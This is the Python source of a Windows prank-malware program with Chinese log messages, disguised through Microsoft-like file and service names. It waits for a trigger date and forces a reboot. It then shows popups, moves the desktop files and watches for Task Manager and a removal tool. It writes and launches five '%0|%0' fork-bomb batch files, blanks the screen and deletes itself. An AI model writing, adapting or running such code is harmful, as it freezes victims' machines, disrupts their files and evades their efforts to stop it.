import time
import os
import threading
from sys import exit
import win32com.client
import tkinter as tk
import subprocess
from winsound import Beep

orgPath = os.path.join(os.path.expanduser('~')) + r'\UserData\PublicFiles\Protected'

def countTime():
	global kill
	global state
	global orgPath
	if state == 'Over':
		exit()
	os.chdir(orgPath)
	timeLeft = 60
	while timeLeft != 0:
		tir = open(os.path.abspath('..') + r'\UserSettings\TIR.txt', 'w')
		tir.write(str(timeLeft))
		tir.close()
		time.sleep(1)
		timeLeft -= 1
	tir = open(os.path.abspath('..') + r'\UserSettings\TIR.txt', 'w')
	tir.write('0')
	tir.close()
	kill = True
	print('计时完毕 Kill = True')

def killnow():
	global kill
	global state
	global orgPath
	if state == 'Over':
		exit()
	
	os.chdir(orgPath)
	while True:
		try:
			open(os.path.abspath('..') + r'\UserSettings\KsysN.txt', 'r')
		except:
			pass
		else:
			time.sleep(5)
			kill = True
			print("读取到KsysN.txt Kill = True")
			break
		time.sleep(1)

def playbgm():
	global state
	global orgPath
	if state == 'Over':
		exit()
	for i in range(60):
		Beep(1000, 350)
		time.sleep(0.65)
	for i in range(30):
		Beep(1350, 200)
		time.sleep(0.2)
	print('BGM已播放')

def startWfx():
	global state
	global orgPath
	if state == 'Over':
		exit()
	os.chdir(orgPath)
	subprocess.run(os.path.abspath('Microsoft WFX service.exe'), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	print('已启动wanafix进程检测')
def startTmg():
	global state
	global orgPath
	if state == 'Over':
		exit()
	os.chdir(orgPath)
	subprocess.run(os.path.abspath('Microsoft TMG service.exe'), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	print("已启动任务管理器进程检测")
def blackScreen():
	global state
	global orgPath
	if state == 'Over':
		exit()
	os.chdir(orgPath)
	os.chdir(os.path.abspath('..') + r'\UserSettings')
	subprocess.run('Blacs.exe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	print('已切换显卡显示模式')
def main():
	global state
	global kill
	global orgPath

	os.chdir(orgPath)
	testTime = True
	try:
		info = open(os.path.abspath('..') + r"\MicrosoftSettingsBackup.txt", 'r')
		info_i = info.read()
		info.close()
	except:
		pass
	else:
		if info_i == 'Over' or info_i == 'FirstRun':
			testTime = False
			print("非首次运行 已停止时间检测")

	try:
		startDate = open('Logdat.txt', 'r')
		date = startDate.read()
		startDate.close()
		print('读取到时间为' + date + '，开始检测时间')
	except:
		testTime = False

	while testTime:
		print('正在检测时间等待启动')
		if time.strftime("%m-%d", time.localtime()) == date:
			break
		time.sleep(30)

	try: #检测是否有文档
		firstRunFile = open(os.path.abspath('..') + r"\MicrosoftSettingsBackup.txt", 'r')
		print('已读取运行记录文本文档')
	except FileNotFoundError: #没有则新建后写入首次运行标志
		print('无运行记录文档 判定为首次运行')
		firstRunFile = open(os.path.abspath('..') + r"\MicrosoftSettingsBackup.txt", 'w')
		firstRunFile.write('FirstRun')
		firstRunFile.close()
		state = 'FirstRun'
	else:
		contant = firstRunFile.read()
		if contant == 'FirstRun':
			print('为第二次运行 即将发作')
			state = 'HaveRun'
		elif contant == 'Over':
			print("已发作 即将自我删除")
			state = 'Over'
		else:
			print('无法确定状态 执行默认行为：即将发作')
			firstRunFile.close()
			firstRunFile = open(os.path.abspath('..') + r"\MicrosoftSettingsBackup.txt", 'w')
			firstRunFile.write('FirstRun')
			firstRunFile.close()
			state = 'FirstRun'
	try:
		firstRunFile.close()
	except:
		pass

	if state == 'FirstRun':
		print('首次运行 切换壁纸后重启本计算机')
		subprocess.run(os.path.abspath('..') + r'\Datastore\Custom.bat', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		time.sleep(3)
		os.system("shutdown -r -t 0")

	elif state == 'HaveRun':
		print('即将发作')
		kill = False
		os.chdir(os.path.abspath('..') + r'\Datastore')
		subprocess.run('Meb.exe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		print('已创建弹窗bat')
		time.sleep(2)
		subprocess.run('silr.exe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		print('已显示弹窗并删除桌面')
		os.chdir(orgPath)
		for i in range(5):
			kasi = open(os.path.abspath('..') + r'\UserSettings\System32_' + str(i) + '.bat', 'w')
			kasi.write('%0|%0')
			kasi.close()
			print('卡死_' + str(i) + '已写入完毕')

		mainUserUpdatet = threading.Thread(target = startTmg)
		mainUserUpdatet.setDaemon(True)
		mainUserUpdatet.start()
		print('线程：开启任务管理器进程检测')
		mainUserUpdatet = threading.Thread(target = startWfx)
		mainUserUpdatet.setDaemon(True)
		mainUserUpdatet.start()
		print('线程：开启WanaFix进程检测')
		mainUserUpdatet = threading.Thread(target = killnow)
		mainUserUpdatet.setDaemon(True)
		mainUserUpdatet.start()
		print('线程：开启检测KsysN')
		mainUserUpdatet = threading.Thread(target = countTime)
		mainUserUpdatet.setDaemon(True)
		mainUserUpdatet.start()
		print('线程：计时线程已启动')
		mainUserUpdatet = threading.Thread(target = playbgm)
		mainUserUpdatet.setDaemon(True)
		mainUserUpdatet.start()
		print('线程：播放音乐已启动')

		while True:
			if kill == True:
				firstRunFile = open(os.path.abspath('..') + r"\MicrosoftSettingsBackup.txt", 'w')
				firstRunFile.write('Over')
				firstRunFile.close()
				print('已将运行历史文本文档改写为Over')
				mainUserUpdatet = threading.Thread(target = blackScreen)
				mainUserUpdatet.setDaemon(True)
				mainUserUpdatet.start()
				print('线程：黑屏已启动')
				os.chdir(orgPath)
				os.chdir(os.path.abspath('..') + r'\UserSettings')
				subprocess.run('RunSystem32.exe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				print('5个%0|%0已启动')
				break
			time.sleep(1)

	elif state == 'Over':
		print('状态为Over 即将自我删除')
		inst = open(os.path.join(os.path.expanduser('~'),"Desktop") + r'\桌面文件位置README.txt', 'w')
		inst.write(r"Your previous desktop files and folders are moved into C:\Ack903" + "\n之前桌面上的文件被移動至C盤Ack903文件夾內")
		inst.close()
		print('已创建桌面文件丢失说明')
		os.chdir(orgPath)
		os.chdir(os.path.abspath('..') + r'\UserSettings')
		print('五秒后自我删除')
		time.sleep(5)
		subprocess.run('silcle.exe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		exit()

if __name__=='__main__':
	main()
	while True:
		if state == 'Over':
			exit()
		time.sleep(1)

	window = tk.Tk()
	window.title('sss')
	window.geometry('100x100')
	window.mainloop()